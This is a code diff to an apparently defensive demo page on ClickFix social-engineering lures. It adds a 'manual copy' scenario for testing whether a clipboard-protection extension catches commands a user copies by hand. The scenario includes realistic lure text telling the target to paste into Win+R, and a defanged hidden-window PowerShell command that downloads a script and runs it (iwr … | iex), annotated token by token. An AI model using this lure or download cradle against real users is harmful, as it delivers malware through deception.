@@ -184,6 +184,13 @@
     background:#fff; border:1px solid #e4e4e4; border-radius:8px; padding:15px 17px; list-style:none; }
   .steps-list li{ margin:0 0 7px; padding-left:2px; } .steps-list li:last-child{ margin-bottom:0; }
   .steps-list b{ font-family:var(--mono); background:#eef0ef; padding:1px 6px; border-radius:4px; font-weight:500; }
+  .payload-box{ margin:18px auto 0; max-width:344px; text-align:left; font-family:var(--mono); font-size:11.5px;
+    line-height:1.65; color:#f0f4f8; background:#12211d; border:1px solid #2c463e; border-radius:8px;
+    padding:13px 15px; word-break:break-all; user-select:all; -webkit-user-select:all; cursor:text;
+    position:relative; }
+  .payload-box::selection, .payload-box ::selection{ background:#50E8A8; color:#07231E; }
+  .payload-cap{ display:block; text-align:center; margin:10px auto 0; font-size:11px; color:#8a8a8a;
+    font-family:var(--sans); }
 
   .copy-btn{ margin-top:22px; display:inline-flex; align-items:center; gap:8px; background:#0A332C; color:#EAF3EE;
     border:none; border-radius:8px; padding:12px 22px; font-size:13.5px; font-weight:600; font-family:var(--sans);
@@ -326,7 +333,8 @@
       <h2>Four lures, one mechanism</h2>
       <p>Pick a scenario. Click “Copy fix command” exactly as a target would — it really does write to your
       clipboard. Use “Check clipboard now” to poll what’s actually sitting there, so a quarantine-and-scan
-      flow resolves in front of you.</p>
+      flow resolves in front of you. The last scenario, <b>Manual copy</b>, has no button at all — you copy
+      the command yourself, which is how a lure slips past protection that only blocks scripted writes.</p>
     </div>
 
     <div class="tabs" role="tablist" aria-label="ClickFix scenarios">
@@ -334,6 +342,7 @@
       <button class="tab" role="tab" aria-selected="false" data-scenario="meet">🎥 Video call error</button>
       <button class="tab" role="tab" aria-selected="false" data-scenario="update">🌐 Browser update failed</button>
       <button class="tab" role="tab" aria-selected="false" data-scenario="alert">⚠️ Threat detected</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="manual">📋 Manual copy (no script)</button>
     </div>
 
     <div class="stage">
@@ -392,7 +401,7 @@
           <p>Blocks every programmatic clipboard write, unconditionally — content is never inspected.</p>
           <ul>
             <li><b>Expected result here:</b> the write attempt above fails or is silently dropped every time, regardless of scenario.</li>
-            <li><b>Blind spot to call out:</b> a lure that asks the target to manually select and copy text (no script involved) still gets through in this mode.</li>
+            <li><b>Blind spot to call out:</b> a lure that asks the target to manually select and copy text (no script involved) still gets through in this mode — that’s the <b>Manual copy</b> scenario above. Mode&nbsp;02 still catches it, because it inspects clipboard contents no matter how they got there.</li>
           </ul>
         </div>
         <div class="panel mode-card m2">
@@ -408,36 +417,6 @@
     </div>
   </section>
 </div>
-
-<section id="guide">
-  <div class="container">
-    <div class="section-head">
-      <div class="idx">03 — Field guide</div>
-      <h2>Spot it. Stop it.</h2>
-      <p>Worth keeping regardless of which scenario or protection mode you’re demoing.</p>
-    </div>
-    <div class="guide-grid">
-      <div class="panel guide-card red">
-        <div class="gh"><span class="dot"></span><h3>Red flags in the lure</h3></div>
-        <ul>
-          <li><b>It asks you to open Run, PowerShell, or Terminal.</b> No legitimate verification, video call, or browser update ever needs that.</li>
-          <li><b>It gives you keyboard steps, not a button.</b> “Press Win+R, then Ctrl+V, then Enter” is the whole attack, spelled out as instructions.</li>
-          <li><b>The fix is oddly specific and urgent.</b> Framing creates just enough pressure to skip the “wait, why?” moment.</li>
-          <li><b>You can’t verify what’s actually on your clipboard</b> until you’ve already pasted it somewhere.</li>
-        </ul>
-      </div>
-      <div class="panel guide-card green">
-        <div class="gh"><span class="dot"></span><h3>What to do instead</h3></div>
-        <ul>
-          <li><b>Never paste into Run, PowerShell, or a terminal because a webpage told you to.</b> That single habit defeats this entire attack class.</li>
-          <li><b>Close the tab.</b> A real verification or update failure survives you leaving and coming back.</li>
-          <li><b>Go to the real service directly</b> by typing the known URL yourself.</li>
-          <li><b>If you already pasted and ran something,</b> disconnect from the network and report it immediately.</li>
-        </ul>
-      </div>
-    </div>
-  </div>
-</section>
 
 <footer>
   <div class="container">
@@ -545,6 +524,33 @@
         {t:' && ', flag:false},
         {t:'%temp%\\rm.bat', flag:true, note:'Runs the "removal tool" immediately, download and execution chained in one command.'}
       ]
+    },
+    manual: {
+      title: "account-confirm.example",
+      manualCopy: true,
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 16px;">📋</div>'+
+          '<h4>Confirm it&rsquo;s really you</h4>'+
+          '<p class="sub">Copy the confirmation command below and run it to finish signing in.</p>'+
+          '<ol class="steps-list">'+
+            '<li>1. Click the box below to <b>select</b> the command</li>'+
+            '<li>2. Press <b>Ctrl + C</b> to copy it yourself</li>'+
+            '<li>3. Press <b>Windows key + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b></li>'+
+          '</ol>'+
+          '<div class="payload-box" id="manualPayload"></div>'+
+          '<span class="payload-cap">↑ no button — the copy only happens when <b>you</b> press Ctrl+C</span>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'powershell -w hidden -c "iwr -useb hxxps://acct-confirm[.]invalid/login.ps1 | iex"',
+      tokens: [
+        {t:'powershell ', flag:false},
+        {t:'-w hidden', flag:true, note:'Launches PowerShell with its window hidden, so nothing visibly opens.'},
+        {t:' -c "iwr -useb ', flag:false},
+        {t:'hxxps://acct-confirm[.]invalid/login.ps1', flag:true, note:'A lookalike "account confirmation" domain (defanged here) hosting the real payload script, not any sign-in service.'},
+        {t:' | iex', flag:true, note:'A "download cradle": fetch the script and run it immediately in memory, nothing saved to disk to inspect.'},
+        {t:'"', flag:false}
+      ]
     }
   };
 
@@ -600,6 +606,27 @@
       return { readable:false };
     }
   }
+  function addRecheckButton(s){
+    var host = document.getElementById('logHost');
+    if (!host || document.getElementById('recheckBtn')) return;
+    var recheck = document.createElement('button');
+    recheck.id = 'recheckBtn';
+    recheck.className = 'recheck-btn';
+    recheck.textContent = '🔍 Check clipboard now';
+    recheck.addEventListener('click', async function(){
+      var c = await readClipboardSafe();
+      if (!c.readable){
+        addLogRow('warn', 'Clipboard read denied — cannot verify right now');
+      } else if (c.text === s.command){
+        addLogRow('ok', 'Clipboard holds the raw payload — not intercepted');
+      } else if (!c.text){
+        addLogRow('blocked', 'Clipboard is empty — looks quarantined');
+      } else {
+        addLogRow('blocked', 'Clipboard differs from payload (currently: "'+c.text.slice(0,40)+'")');
+      }
+    });
+    host.appendChild(recheck);
+  }
 
   function render(key){
     current = key;
@@ -646,29 +673,17 @@
           }
           pasteHint.textContent = '↳ now click the Run field, then "Paste"';
           pasteHint.style.color = 'var(--safe)';
-
-          var host = document.getElementById('logHost');
-          if (host && !document.getElementById('recheckBtn')){
-            var recheck = document.createElement('button');
-            recheck.id = 'recheckBtn';
-            recheck.className = 'recheck-btn';
-            recheck.textContent = '🔍 Check clipboard now';
-            recheck.addEventListener('click', async function(){
-              var c = await readClipboardSafe();
-              if (!c.readable){
-                addLogRow('warn', 'Clipboard read denied — cannot verify right now');
-              } else if (c.text === s.command){
-                addLogRow('ok', 'Still the raw payload — not intercepted');
-              } else if (!c.text){
-                addLogRow('blocked', 'Clipboard is empty — looks quarantined');
-              } else {
-                addLogRow('blocked', 'Clipboard differs from payload (currently: "'+c.text.slice(0,40)+'")');
-              }
-            });
-            host.appendChild(recheck);
-          }
+          addRecheckButton(s);
         }
       });
+    }
+
+    if (s.manualCopy){
+      var payloadEl = document.getElementById('manualPayload');
+      if (payloadEl) payloadEl.textContent = s.command;
+      pasteHint.textContent = '↳ select the command, press Ctrl+C yourself, then click "Paste"';
+      addLogRow('warn', 'No script runs here — nothing is written until YOU press Ctrl+C. Copy it, then use “Check clipboard now” to see what your extension did.');
+      addRecheckButton(s);
     }
   }
 
